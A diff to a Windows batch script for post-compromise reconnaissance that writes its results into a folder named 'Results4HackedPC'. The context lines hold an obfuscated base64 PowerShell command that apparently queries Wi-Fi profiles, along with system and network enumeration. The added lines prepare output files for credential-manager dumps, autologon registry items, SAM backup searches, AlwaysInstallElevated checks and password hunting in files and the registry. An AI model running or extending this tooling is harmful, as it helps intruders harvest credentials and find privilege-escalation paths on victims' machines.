@@ -6,6 +6,47 @@ powershell -EncodedCommand "KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBv
 
 mkdir %USERPROFILE%\Results4HackedPC\WindowsPrograms
 
+@echo off
+setlocal
+
+set "output_dir=%USERPROFILE%\WindowsPrograms"
+
+REM Create output directory if it doesn't exist
+if not exist "%output_dir%" mkdir "%output_dir%"
+
+REM Create empty files in the output directory
+type nul > "%output_dir%\Basic-System-Information.txt"
+type nul > "%output_dir%\Environment-Variables.txt"
+type nul > "%output_dir%\Network-Information.txt"
+type nul > "%output_dir%\DNS-Servers.txt"
+type nul > "%output_dir%\ARP-cache.txt"
+type nul > "%output_dir%\Routing-Table.txt"
+type nul > "%output_dir%\Network-Connections.txt"
+type nul > "%output_dir%\Connected-Drives.txt"
+type nul > "%output_dir%\Firewall-Config.txt"
+type nul > "%output_dir%\Current-User.txt"
+type nul > "%output_dir%\User-Privileges.txt"
+type nul > "%output_dir%\Local-Users.txt"
+type nul > "%output_dir%\Logged-in-Users.txt"
+type nul > "%output_dir%\Credential-Manager.txt"
+type nul > "%output_dir%\User-Autologon-Registry-Items.txt"
+type nul > "%output_dir%\Local-Groups.txt"
+type nul > "%output_dir%\Local-Administrators.txt"
+type nul > "%output_dir%\User-Directories.txt"
+type nul > "%output_dir%\Searching-for-SAM-backup-files.txt"
+type nul > "%output_dir%\Running-Processes.txt"
+type nul > "%output_dir%\Installed-Software-Directories.txt"
+type nul > "%output_dir%\Software-in-Registry.txt"
+type nul > "%output_dir%\Folders-with-Everyone-Permissions.txt"
+type nul > "%output_dir%\Folders-with-BUILTIN-User-Permissions.txt"
+type nul > "%output_dir%\Checking-registry-for-AlwaysInstallElevated.txt"
+type nul > "%output_dir%\Scheduled-Tasks.txt"
+type nul > "%output_dir%\Startup-Commands.txt"
+type nul > "%output_dir%\Searching-for-files-with-passwords.txt"
+type nul > "%output_dir%\Searching-HKLM-for-passwords.txt"
+type nul > "%output_dir%\Searching-HKCU-for-passwords.txt"
+
+
 powershell -c "Start-Process 'systeminfo' -NoNewWindow -Wait" > %USERPROFILE%\WindowsPrograms\Basic-System-Information.txt
 powershell -c "Get-ChildItem Env: | ft Key,Value" > %USERPROFILE%\WindowsPrograms\Environment-Variables.txt
 powershell -c "Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address" > %USERPROFILE%\WindowsPrograms\Network-Information.txt
